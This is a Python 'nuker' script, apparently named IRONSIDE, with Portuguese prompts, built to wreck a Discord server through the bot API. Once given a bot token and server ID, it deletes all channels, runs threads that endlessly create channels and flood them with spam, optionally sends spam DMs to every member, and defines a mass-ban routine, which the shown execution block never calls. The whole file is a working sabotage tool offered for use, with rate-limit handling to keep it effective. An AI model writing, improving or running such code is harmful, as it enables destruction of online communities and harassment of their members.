import requests, threading, time, random
import os

os.system("color 0C")


# === SPLASH SCREEN ===
def splash():
    os.system("cls" if os.name == "nt" else "clear")
    print("\033[91m" + r"""
████████╗██╗  ██╗██╗███████╗██████╗   ██████╗ 
╚══██╔══╝██║  ██║██║██║  ██╔██╗      ██╔═══██╗
   ██║   ███████║██║███████║██║  ███╗██║   ██║
   ██║   ██╔══██║██║██╔══██║██║   ██║██║   ██║
   ██║   ██║  ██║██║██║  ██║╚██████╔╝╚██████╔╝
   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ 

                ✦ IRONSIDE — FULL SERVER DOMINATION ✦
                     | @riot.ironside | 2025
    """ + "\033[0m")
    time.sleep(2)


splash()

# === SETUP ===
bot_token = input("\033[91mColoque o Token do seu Bot ➜ \033[0m") 
guild_id = input("\033[91mColoque o ID do servidor ➜ \033[0m")
spam_message = input("\033[91mDigite a mensagem para enviar nos novos canais ➜ \033[0m")
channel_name = input("\033[91mInsira o nome base para novos canais ➜ \033[0m")
dm_message = input("\033[91mColoque a mensagem da DM ➜ \033[0m")
delay = float(input("\033[91mAtraso entre cada ação (segundos) ➜ \033[0m"))
create_threads = int(input("\033[91mQuantos tópicos de criação de canais? ➜ \033[0m"))
dm_enabled = input("\033[91mAtivar DM spam? [y/n] ➜ \033[0m").lower() == "y"
ban_enabled = input("\033[91mAtivar mass ban? [y/n] ➜ \033[0m").lower() == "y"


headers = {
    "Authorization": f"Bot {bot_token}",
    "Content-Type": "application/json"
}

# === DELETE EXISTING CHANNELS ===
def delete_all_channels():
    print("\n[*] Deleting all existing channels...\n")
    r = requests.get(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers=headers)
    if r.status_code == 200:
        for channel in r.json():
            channel_id = channel["id"]
            del_res = requests.delete(f"https://discord.com/api/v10/channels/{channel_id}", headers=headers)
            if del_res.status_code in [200, 204]:
                print(f"[+] Deleted channel {channel['name']}")
            elif del_res.status_code == 429:
                retry = del_res.json().get("retry_after", 1)
                print(f"[!] Rate limited on delete. Waiting {retry}s")
                time.sleep(retry)
    else:
        print(f"[!] Failed to fetch channels: {r.text}")

# === CREATE CHANNEL + SPAM @everyone ===
def create_and_ping():
    while True:
        name = f"{channel_name}-{random.randint(1000,9999)}"
        payload = {"name": name, "type": 0}
        r = requests.post(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers=headers, json=payload)
        if r.status_code == 201:
            new_channel_id = r.json()["id"]
            print(f"[+] Created channel: {name}")
            for i in range(8):  # Alterado para 8 mensagens
                msg = {"content": spam_message}
                ping_res = requests.post(f"https://discord.com/api/v10/channels/{new_channel_id}/messages", headers=headers, json=msg)
                if ping_res.status_code == 429:
                    retry = ping_res.json().get("retry_after", 1)
                    print(f"[!] Rate limited on message send. Waiting {retry}s")
                    time.sleep(retry)
                elif ping_res.status_code in [200, 204]:
                    print(f"[+] Sent message in {name} ({i+1}/8)")  # Alterado para 8 mensagens
                time.sleep(0.5)
        elif r.status_code == 429:
            retry = r.json().get("retry_after", 1)
            print(f"[!] Rate limited on create. Waiting {retry}s")
            time.sleep(retry)
        else:
            print(f"[!] Failed to create: {r.text}")
        time.sleep(delay)

# === DM ALL MEMBERS ===
def dm_all_members():
    print("\033[91m\n[*] Enviando DMs para todos os membros...\n\033[0m")
    r = requests.get(f"https://discord.com/api/v10/guilds/{guild_id}/members?limit=1000", headers=headers)
    if r.status_code == 200:
        for member in r.json():
            uid = member["user"]["id"]
            try:
                # Verifica se o membro já tem uma DM aberta
                dm_res = requests.post(
                    "https://discord.com/api/v10/users/@me/channels", 
                    headers=headers, 
                    json={"recipient_id": uid}
                )
                if dm_res.status_code == 200:
                    dm_channel = dm_res.json()["id"]
                    # Envia a mensagem da DM
                    msg_res = requests.post(
                        f"https://discord.com/api/v10/channels/{dm_channel}/messages", 
                        headers=headers, 
                        json={"content": dm_message}
                    )
                    if msg_res.status_code in [200, 204]:
                        print(f"\033[91m[+] DM enviada para {member['user']['username']}\033[0m")
                    elif msg_res.status_code == 429:
                        retry = msg_res.json().get("retry_after", 1)
                        print(f"\033[91m[!] Rate limit na DM. Esperando {retry}s\033[0m")
                        time.sleep(retry)
                    time.sleep(0.5)
                else:
                    print(f"\033[91m[!] Erro ao criar DM para {member['user']['username']}: {dm_res.text}\033[0m")
            except Exception as e:
                print(f"\033[91m[!] Falha ao enviar DM para {uid}: {e}\033[0m")
    else:
        print("\033[91m[!] Não foi possível obter a lista de membros\033[0m")

# === MASS BANN ALL MEMBERS ===
def mass_ban():
    print("\033[91m\n[*] Iniciando banimento em massa de todos os membros do servidor...\n\033[0m")
    r = requests.get(f"https://discord.com/api/v10/guilds/{guild_id}/members?limit=1000", headers=headers)
    if r.status_code == 200:
        for member in r.json():
            uid = member["user"]["id"]
            try:
                ban = requests.put(f"https://discord.com/api/v10/guilds/{guild_id}/bans/{uid}", headers=headers, json={"delete_message_days": 1, "reason": "COM Client v2 | Server Nuked"})
                if ban.status_code in [200, 204]:
                    print(f"[+] Banned: {member['user']['username']} ({uid})")
                elif ban.status_code == 429:
                    retry = ban.json().get("retry_after", 1)
                    print(f"[!] Rate limited on ban. Waiting {retry}s")
                    time.sleep(retry)
                else:
                    print(f"[!] Failed to ban {uid}: {ban.text}")
            except Exception as e:
                print(f"[!] Error banning {uid}: {e}")
            time.sleep(0.5)
    else:
        print("\033[91m[!] Não foi possível obter a lista de membros para banir\033[0m")



# === EXECUTION ===
delete_all_channels()

for _ in range(create_threads):
    threading.Thread(target=create_and_ping, daemon=True).start()

if dm_enabled:
    threading.Thread(target=dm_all_members, daemon=True).start()

input("\033[91m\n[+] Pressione ENTER para parar o nuker...\033[0m")